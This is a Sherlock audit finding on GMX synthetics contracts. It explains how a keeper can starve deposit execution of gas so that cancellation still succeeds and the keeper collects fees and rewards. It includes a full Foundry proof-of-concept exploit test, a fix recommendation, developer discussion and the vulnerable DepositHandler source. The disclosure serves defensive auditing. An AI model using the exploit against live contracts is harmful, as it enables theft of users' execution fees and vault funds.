{
  "Title": "M-31: Keeper can make deposits/orders/withdrawals fail and receive fee+rewards",
  "Content": "# Issue M-31: Keeper can make deposits/orders/withdrawals fail and receive fee+rewards \n\nSource: https://github.com/sherlock-audit/2023-02-gmx-judging/issues/116 \n\n## Found by \n0xdeadbeef\n\n## Summary\n\nMalicious keeper can make execution of deposits/orders/withdrawals fail by providing limited gas to the execution. \n\nIf enough gas is sent for the cancellation to succeed but for the execution to fail the keeper is able to receive the execution fee + incentive rewards and cancel all deposits/orders/withdrawals.\n\n## Vulnerability Detail\n\nKeepers can execute any deposits/orders/withdrawals. \nAll executions are attempted and if they fail, they are cancelled and the keeper is paid for the execution fee + rewards.\nExample for executing deposits:\nhttps://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/exchange/DepositHandler.sol#L92\n```solidity\nfunction executeDeposit(\n        bytes32 key,\n        OracleUtils.SetPricesParams calldata oracleParams\n    ) external\n        globalNonReentrant\n        onlyOrderKeeper\n        withOraclePrices(oracle, dataStore, eventEmitter, oracleParams)\n    {\n        uint256 startingGas = gasleft();\n\n        try this._executeDeposit(\n            key,\n            oracleParams,\n            msg.sender,\n            startingGas\n        ) {\n        } catch (bytes memory reasonBytes) {\n            _handleDepositError(\n                key,\n                startingGas,\n                reasonBytes\n            );\n        }\n    }\n```\n\nFor the attack to succeed, the keeper needs to make `this._executeDeposit` revert. \nDue to the 64/63 rule the attack will succeed if both of the following conditions meet:\n1. 63/64 of the supplied gas will cause an out of gas in the `try` statement \n2. 1/64 of the supplied gas is enough to execute the `catch` statement. \n\nConsidering `2000000` is the max callback limit and native token transfer gas limit is large enough to support contracts the above conditions can be met.\n\nI created a POC that exploits the vulnerability on deposits. Keep in mind that it might be easier (lower limits) for Orders as more logic is performed in the `try` statement and therefore more gas is supplied.\nSee in the `Code Snippet` section\n\n## Impact\n\n1. Keeper can remove all deposits/withdrawals/orders from the protocol.\n\t1. Essentially stealing all execution fees paid\n2. Keeper can create deposits and by leveraging the bug can cancel them when executing while receiving rewards.\n\t1. Vaults will be drained\n\n## Code Snippet\n\nTo get it running, first install foundry using the following command:\n1. `curl -L https://foundry.paradigm.xyz | bash` (from https://book.getfoundry.sh/getting-started/installation#install-the-latest-release-by-using-foundryup)\n4. If local node is not already running and contracts are not deployed, configured - execute the following:\n```bash\nnpx hardhat node\n```\n3 Perform the following set of commands from the repository root.\n```bash\nrm -rf foundry; foundryup; mkdir foundry; cd foundry; forge init --no-commit\n```\n5. Add the following to `foundry/test/KeeperCancelExecutions.t.sol\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\ninterface IExchangeRouter {\n    function createDeposit(KeeperCancelExecution.CreateDepositParams calldata params) external returns (bytes32);\n}\n\ninterface IDepositHandler {\n    function executeDeposit( bytes32 key, SetPricesParams calldata oracleParams) external;\n}\ninterface IReader {\n    function getMarket(address dataStore, address key) external view returns (Market.Props memory); \n}\n\ninterface IDataStore {\n    function getBytes32(bytes32 key) external view returns (bytes32);\n    function setUint(bytes32 key, uint256 value) external;\n}\nlibrary Market {\n    struct Props {\n        address marketToken;\n        address indexToken;\n        address longToken;\n        address shortToken;\n    }\n}\nlibrary Deposit {\n    struct Props {\n        Addresses addresses;\n        Numbers numbers;\n        Flags flags;\n    }\n    struct Addresses {\n        address account;\n        address receiver;\n        address callbackContract;\n        address market;\n        address initialLongToken;\n        address initialShortToken;\n        address[] longTokenSwapPath;\n        address[] shortTokenSwapPath;\n    }\n    struct Numbers {\n        uint256 initialLongTokenAmount;\n        uint256 initialShortTokenAmount;\n        uint256 minMarketTokens;\n        uint256 updatedAtBlock;\n        uint256 executionFee;\n        uint256 callbackGasLimit;\n    }\n    struct Flags {\n        bool shouldUnwrapNativeToken;\n    }\n}\nstruct SetPricesParams {\n    uint256 signerInfo;\n    address[] tokens;\n    uint256[] compactedMinOracleBlockNumbers;\n    uint256[] compactedMaxOracleBlockNumbers;\n    uint256[] compactedOracleTimestamps;\n    uint256[] compactedDecimals;\n    uint256[] compactedMinPrices;\n    uint256[] compactedMinPricesIndexes;\n    uint256[] compactedMaxPrices;\n    uint256[] compactedMaxPricesIndexes;\n    bytes[] signatures;\n    address[] priceFeedTokens;\n}\n\ncontract Keeper is Test {\n    fallback() external payable {\n        bytes32 x;\n\n        if(gasleft() > 1_000_000) {\n            for(uint256 i=0; i<600000;i++){\n                x = keccak256(abi.encode(i)); \n            }\n            revert(\"aaa\");\n        }\n    }\n}\ncontract Callback is Test {\n    bytes32 x;\n\n    function afterDepositExecution(bytes32 key, Deposit.Props memory deposit) external {\n        for(uint256 i=0; i<5100;i++){\n            x = keccak256(abi.encode(i)); // 1993336 gas\n        }\n        return;\n    }\n    function afterDepositCancellation(bytes32 key, Deposit.Props memory deposit) external{\n    }\n\n}\n\ninterface IRoleStore{\n    function grantRole(address account, bytes32 roleKey) external;\n}\n\ncontract KeeperCancelExecution is Test {\n    struct CreateDepositParams {\n        address receiver;\n        address callbackContract;\n        address market;\n        address initialLongToken;\n        address initialShortToken;\n        address[] longTokenSwapPath;\n        address[] shortTokenSwapPath;\n        uint256 minMarketTokens;\n        bool shouldUnwrapNativeToken;\n        uint256 executionFee;\n        uint256 callbackGasLimit;\n    }\n\n    uint256 public constant COMPACTED_64_BIT_LENGTH = 64;\n    uint256 public constant COMPACTED_64_BITMASK = ~uint256(0) >> (256 - COMPACTED_64_BIT_LENGTH);\n    \n        \n    uint256 public constant COMPACTED_32_BIT_LENGTH = 32;\n    uint256 public constant COMPACTED_32_BITMASK = ~uint256(0) >> (256 - COMPACTED_32_BIT_LENGTH);\n\n    uint256 public constant COMPACTED_8_BIT_LENGTH = 8;\n    uint256 public constant COMPACTED_8_BITMASK = ~uint256(0) >> (256 - COMPACTED_8_BIT_LENGTH);\n\n    IExchangeRouter EXCHANGE_ROUTER = IExchangeRouter(0x4bf010f1b9beDA5450a8dD702ED602A104ff65EE);\n    address dataStore = 0x09635F643e140090A9A8Dcd712eD6285858ceBef;\n    IReader reader = IReader(0xD49a0e9A4CD5979aE36840f542D2d7f02C4817Be);\n    address WETH = 0x99bbA657f2BbC93c02D617f8bA121cB8Fc104Acf;\n    address USDC = 0x9d4454B023096f34B160D6B654540c56A1F81688;\n    address depositVault = 0xB0f05d25e41FbC2b52013099ED9616f1206Ae21B;\n    address controller = 0x1429859428C0aBc9C2C47C8Ee9FBaf82cFA0F20f;\n    address roleStore = 0x5FbDB2315678afecb367f032d93F642f64180aa3;\n    address ROLE_ADMIN = 0xe1Fd27F4390DcBE165f4D60DBF821e4B9Bb02dEd;\n    IDepositHandler depositHandler = IDepositHandler(0xD42912755319665397FF090fBB63B1a31aE87Cee);\n\n    address signer = 0xBcd4042DE499D14e55001CcbB24a551F3b954096;\n    uint256 pk = 0xf214f2b2cd398c806f84e317254e0f0b801d0643303237d97a22a48e01628897;\n\n    Callback callback = new Callback();\n    Keeper ORDER_KEEPER = new Keeper();\n\n    using Market for Market.Props;\n\n    function setUp() public {\n    }\n\n    function testCreateDepositAndCancel() external {\n        // Setup market \n        Market.Props memory market = reader.getMarket(dataStore, address(0xc50051e38C72DC671C6Ae48f1e278C1919343529));\n        address marketWethUsdc = market.marketToken;\n        address wethIndex = market.indexToken;\n        address wethLong = market.longToken;\n        address usdcShort = market.shortToken;\n        vm.startPrank(controller);\n        IDataStore(dataStore).setUint(keccak256(abi.encode(\"EXECUTION_GAS_FEE_MULTIPLIER_FACTOR\")), 10**30);\n        IDataStore(dataStore).setUint(keccak256(abi.encode(\"NATIVE_TOKEN_TRANSFER_GAS_LIMIT\")), 4000000);\n        vm.stopPrank();\n\n        vm.prank(ROLE_ADMIN);\n        IRoleStore(roleStore).grantRole(address(ORDER_KEEPER), keccak256(abi.encode(\"ORDER_KEEPER\")));\n\n        // validate weth long usdc short index weth\n        assertEq(WETH, wethLong);\n        assertEq(WETH, wethIndex);\n        assertEq(USDC, usdcShort);\n\n        // initial fund deposit vault and weth \n        uint256 depositEth = 1000 ether;\n        uint256 executionFee = 100000;\n        address[] memory addrArray; \n        deal(USDC, depositVault, depositEth);\n        vm.deal(depositVault, depositEth);\n        vm.prank(depositVault);\n        WETH.call{value: depositEth}(abi.encodeWithSelector(bytes4(keccak256(\"deposit()\"))));\n        vm.deal(WETH, depositEth);\n\n        // Create deposit params\n        CreateDepositParams memory deposit = CreateDepositParams(\n            address(this), // receiver\n            address(callback), // callback \n            marketWethUsdc, // market\n            wethLong, // inital longtoken\n            usdcShort, // inital short token\n            addrArray, // longtokenswappath\n            addrArray, // shortokenswappath\n            0, // minmarkettokens\n            true,// shouldunwrapnativetoken\n            executionFee, // executionfee\n            2000000 // callbackGasLimit\n        );\n\n        // Create deposit!\n        bytes32 depositKey = EXCHANGE_ROUTER.createDeposit(deposit);\n\n        // Maliciously execute legit deposit\n        vm.startPrank(address(ORDER_KEEPER));\n        depositHandler.executeDeposit{gas: 6_900_000}(depositKey, getPriceParams()); // get correct price commands. \n\n        // Validate exploit successful by seeing that the deposit was was paid back to account minus execution fee\n        (bool success, bytes memory data) = WETH.call(abi.encodeWithSelector(bytes4(keccak256(\"balanceOf(address)\")), address(this)));\n        uint256 balance = abi.decode(data, (uint256));\n        assertEq(balance, depositEth - executionFee);\n    }\n\n    function getPriceParams() internal returns (SetPricesParams memory) {\n        address[] memory tokens = new address[](2);\n        tokens[0] = WETH;\n        tokens[1] = USDC;\n        \n        // min oracle block numbers\n        uint256[] memory uncompactedMinOracleBlockNumbers = new uint256[](2);\n        uncompactedMinOracleBlockNumbers[0] = block.number;\n        uncompactedMinOracleBlockNumbers[1] = block.number;\n\n        // decimals 18\n        uint256[] memory uncompactedDecimals = new uint256[](2);\n        uncompactedDecimals[0] = 18;\n        uncompactedDecimals[1] = 18;\n\n        // max price AGE\n        uint256[] memory uncompactedMaxPriceAge = new uint256[](2);\n        uncompactedMaxPriceAge[0] = block.timestamp;\n        uncompactedMaxPriceAge[1] = block.timestamp;\n        \n        uint256[] memory uncompactedMaxPricesIndexes = new uint256[](2);\n        uncompactedMaxPricesIndexes[0] = 0;\n        uncompactedMaxPricesIndexes[1] = 0;\n\n        uint256[] memory uncompactedMaxPrices = new uint256[](2);\n        uncompactedMaxPrices[0] = 1000;\n        uncompactedMaxPrices[1] = 1000;\n\n        // signerInfo\n        uint256 signerInfo = 1;\n        uint256[] memory compactedMinOracleBlockNumbers = getCompactedValues(uncompactedMinOracleBlockNumbers, COMPACTED_64_BIT_LENGTH, COMPACTED_64_BITMASK);\n        uint256[] memory compactedDecimals = getCompactedValues(uncompactedDecimals, COMPACTED_8_BIT_LENGTH, COMPACTED_8_BITMASK);\n        uint256[] memory compactedMaxPriceAge = getCompactedValues(uncompactedMaxPriceAge, COMPACTED_64_BIT_LENGTH, COMPACTED_64_BITMASK);\n        uint256[] memory compactedMaxPricesIndexes = getCompactedValues(uncompactedMaxPricesIndexes, COMPACTED_8_BIT_LENGTH, COMPACTED_8_BITMASK);\n        uint256[] memory compactedMaxPrices = getCompactedValues(uncompactedMaxPrices, COMPACTED_32_BIT_LENGTH, COMPACTED_32_BITMASK);\n\n        bytes[] memory sig = getSig(tokens, uncompactedDecimals, uncompactedMaxPrices);\n\n        SetPricesParams memory oracleParams = SetPricesParams(\n            signerInfo, // signerInfo\n            tokens, //tokens\n            compactedMinOracleBlockNumbers, // compactedMinOracleBlockNumbers\n            compactedMinOracleBlockNumbers, //compactedMaxOracleBlockNumbers\n            compactedMaxPriceAge, //  compactedOracleTimestamps\n            compactedDecimals, // compactedDecimals\n            compactedMaxPrices, // compactedMinPrices\n            compactedMaxPricesIndexes, // compactedMinPricesIndexes\n            compactedMaxPrices, // compactedMaxPrices\n            compactedMaxPricesIndexes, // compactedMaxPricesIndexes\n            sig, // signatures\n            new address[](0) // priceFeedTokens\n        );\n        return oracleParams;\n    }\n\n    function getSig(address[] memory tokens, uint256[] memory decimals, uint256[] memory prices) internal returns (bytes[] memory){\n        signer = vm.addr(pk);\n        bytes[] memory ret = new bytes[](tokens.length);\n        for(uint256 i=0; i<tokens.length; i++){\n            bytes32 digest = toEthSignedMessageHash(\n                keccak256(abi.encode(\n                    keccak256(abi.encode(block.chainid, \"xget-oracle-v1\")),\n                    block.number,\n                    block.number,\n                    block.timestamp,\n                    bytes32(0),\n                    tokens[i],\n                    getDataStoreValueForToken(tokens[i]),\n                    10 ** decimals[i],\n                    prices[i],\n                    prices[i]\n                ))\n            );\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);\n            ret[i] = abi.encodePacked(r,s,v);\n        }\n        return ret;\n    }\n\n    function getDataStoreValueForToken(address token) internal returns (bytes32) {\n        return IDataStore(dataStore).getBytes32(keccak256(abi.encode(keccak256(abi.encode(\"ORACLE_TYPE\")), token)));\n    }\n\n    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32 message) {\n        assembly {\n            mstore(0x00, \"\\x19Ethereum Signed Message:\\n32\")\n            mstore(0x1c, hash)\n            message := keccak256(0x00, 0x3c)\n        }\n    }\n    function getCompactedValues(\n        uint256[] memory uncompactedValues,\n        uint256 compactedValueBitLength,\n        uint256 bitmask\n    ) internal returns (uint256[] memory) {\n        uint256 compactedValuesPerSlot = 256 / compactedValueBitLength;\n        bool stopLoop = false;\n        uint256[] memory compactedValues = new uint256[](uncompactedValues.length / compactedValuesPerSlot + 1);\n        for(uint256 i=0; i < (uncompactedValues.length - 1) / compactedValuesPerSlot + 1; i++){\n            uint256 valuePerSlot;\n            for(uint256 j=0; j< compactedValuesPerSlot; j++){\n                uint256 index = i * compactedValuesPerSlot + j;\n                if(index >= uncompactedValues.length) {\n                    stopLoop = true;\n                    break;\n                }\n                uint256 value = uncompactedValues[index];\n                uint256 bitValue = value << (j * compactedValueBitLength);\n                valuePerSlot = valuePerSlot | bitValue;\n            }\n            compactedValues[i] = valuePerSlot;\n            if(stopLoop){\n                break;\n            }\n        }\n        return compactedValues;\n    }\n}\n```\n6. execute `forge test --fork-url=\"http://127.0.0.1:8545\"  -v -m \"testCreateDepositAndCancel\"`\n\n## Tool used\n\nVS Code, foundry\n\n## Recommendation\n\nAdd a buffer of gas that needs to be supplied to the execute function to make sure the `try` statement will not revert because of out of gas. \n\n\n\n## Discussion\n\n**xvi10**\n\nThis is a valid issue but the risk of a keeper intentionally doing this should be low as there is not much benefit aside from possibly slightly higher execution fees received, a keeper network can help to reduce the risk of this and malicious keepers may be removed\n\n**xvi10**\n\nIt is possible to introduce a minimum gas limit but it may be difficult to manage this such that it closely matches the actual gas required while remaining below the maximum block gas limit\n\nAllowing keepers to accurately estimate the gas limit off-chain may allow transactions to be executed faster as the transaction can more easily be included in blocks\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/6",
  "Code": [
    {
      "filename": "gmx-synthetics/contracts/exchange/DepositHandler.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.0;\n\nimport \"../utils/GlobalReentrancyGuard.sol\";\n\nimport \"./ExchangeUtils.sol\";\nimport \"../role/RoleModule.sol\";\nimport \"../event/EventEmitter.sol\";\nimport \"../feature/FeatureUtils.sol\";\n\nimport \"../market/Market.sol\";\nimport \"../market/MarketToken.sol\";\n\nimport \"../deposit/Deposit.sol\";\nimport \"../deposit/DepositVault.sol\";\nimport \"../deposit/DepositUtils.sol\";\nimport \"../deposit/ExecuteDepositUtils.sol\";\nimport \"../oracle/Oracle.sol\";\nimport \"../oracle/OracleModule.sol\";\n\n// @title DepositHandler\n// @dev Contract to handle creation, execution and cancellation of deposits\ncontract DepositHandler is GlobalReentrancyGuard, RoleModule, OracleModule {\n    using Deposit for Deposit.Props;\n\n    EventEmitter public immutable eventEmitter;\n    DepositVault public immutable depositVault;\n    Oracle public immutable oracle;\n\n    constructor(\n        RoleStore _roleStore,\n        DataStore _dataStore,\n        EventEmitter _eventEmitter,\n        DepositVault _depositVault,\n        Oracle _oracle\n    ) RoleModule(_roleStore) GlobalReentrancyGuard(_dataStore) {\n        eventEmitter = _eventEmitter;\n        depositVault = _depositVault;\n        oracle = _oracle;\n    }\n\n    // @dev creates a deposit in the deposit store\n    // @param account the depositing account\n    // @param params DepositUtils.CreateDepositParams\n    function createDeposit(\n        address account,\n        DepositUtils.CreateDepositParams calldata params\n    ) external globalNonReentrant onlyController returns (bytes32) {\n        FeatureUtils.validateFeature(dataStore, Keys.createDepositFeatureDisabledKey(address(this)));\n\n        return DepositUtils.createDeposit(\n            dataStore,\n            eventEmitter,\n            depositVault,\n            account,\n            params\n        );\n    }\n\n    // @dev cancels a deposit\n    // @param key the deposit key\n    function cancelDeposit(bytes32 key) external globalNonReentrant onlyController {\n        uint256 startingGas = gasleft();\n\n        DataStore _dataStore = dataStore;\n        Deposit.Props memory deposit = DepositStoreUtils.get(_dataStore, key);\n\n        FeatureUtils.validateFeature(_dataStore, Keys.cancelDepositFeatureDisabledKey(address(this)));\n\n        ExchangeUtils.validateRequestCancellation(\n            _dataStore,\n            deposit.updatedAtBlock(),\n            \"Deposit\"\n        );\n\n        DepositUtils.cancelDeposit(\n            _dataStore,\n            eventEmitter,\n            depositVault,\n            key,\n            deposit.account(),\n            startingGas,\n            Keys.USER_INITIATED_CANCEL,\n            \"\"\n        );\n    }\n\n    // @dev executes a deposit\n    // @param key the key of the deposit to execute\n    // @param oracleParams OracleUtils.SetPricesParams\n    function executeDeposit(\n        bytes32 key,\n        OracleUtils.SetPricesParams calldata oracleParams\n    ) external\n        globalNonReentrant\n        onlyOrderKeeper\n        withOraclePrices(oracle, dataStore, eventEmitter, oracleParams)\n    {\n        uint256 startingGas = gasleft();\n\n        try this._executeDeposit(\n            key,\n            oracleParams,\n            msg.sender,\n            startingGas\n        ) {\n        } catch (bytes memory reasonBytes) {\n            _handleDepositError(\n                key,\n                startingGas,\n                reasonBytes\n            );\n        }\n    }\n\n    // @dev simulate execution of a deposit to check for any errors\n    // @param key the deposit key\n    // @param params OracleUtils.SimulatePricesParams\n    function simulateExecuteDeposit(\n        bytes32 key,\n        OracleUtils.SimulatePricesParams memory params\n    ) external\n        onlyController\n        withSimulatedOraclePrices(oracle, params)\n        globalNonReentrant\n    {\n\n        uint256 startingGas = gasleft();\n        OracleUtils.SetPricesParams memory oracleParams;\n\n        this._executeDeposit(\n            key,\n            oracleParams,\n            msg.sender,\n            startingGas\n        );\n    }\n\n    // @dev executes a deposit\n    // @param oracleParams OracleUtils.SetPricesParams\n    // @param keeper the keeper executing the deposit\n    // @param startingGas the starting gas\n    function _executeDeposit(\n        bytes32 key,\n        OracleUtils.SetPricesParams memory oracleParams,\n        address keeper,\n        uint256 startingGas\n    ) external onlySelf {\n        FeatureUtils.validateFeature(dataStore, Keys.executeDepositFeatureDisabledKey(address(this)));\n\n        uint256[] memory minOracleBlockNumbers = OracleUtils.getUncompactedOracleBlockNumbers(\n            oracleParams.compactedMinOracleBlockNumbers,\n            oracleParams.tokens.length\n        );\n\n        uint256[] memory maxOracleBlockNumbers = OracleUtils.getUncompactedOracleBlockNumbers(\n            oracleParams.compactedMaxOracleBlockNumbers,\n            oracleParams.tokens.length\n        );\n\n        ExecuteDepositUtils.ExecuteDepositParams memory params = ExecuteDepositUtils.ExecuteDepositParams(\n            dataStore,\n            eventEmitter,\n            depositVault,\n            oracle,\n            key,\n            minOracleBlockNumbers,\n            maxOracleBlockNumbers,\n            keeper,\n            startingGas\n        );\n\n        ExecuteDepositUtils.executeDeposit(params);\n    }\n\n    // @dev handle errors from deposits\n    // @param key the deposit key\n    // @param startingGas the starting gas of the txn\n    // @param reasonBytes the reason bytes of the error\n    function _handleDepositError(\n        bytes32 key,\n        uint256 startingGas,\n        bytes memory reasonBytes\n    ) internal {\n        (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);\n\n        bytes4 errorSelector = ErrorUtils.getErrorSelectorFromData(reasonBytes);\n\n        if (OracleUtils.isEmptyPriceError(errorSelector)) {\n            ErrorUtils.revertWithCustomError(reasonBytes);\n        }\n\n        DepositUtils.cancelDeposit(\n            dataStore,\n            eventEmitter,\n            depositVault,\n            key,\n            msg.sender,\n            startingGas,\n            reason,\n            reasonBytes\n        );\n    }\n}"
    }
  ]
}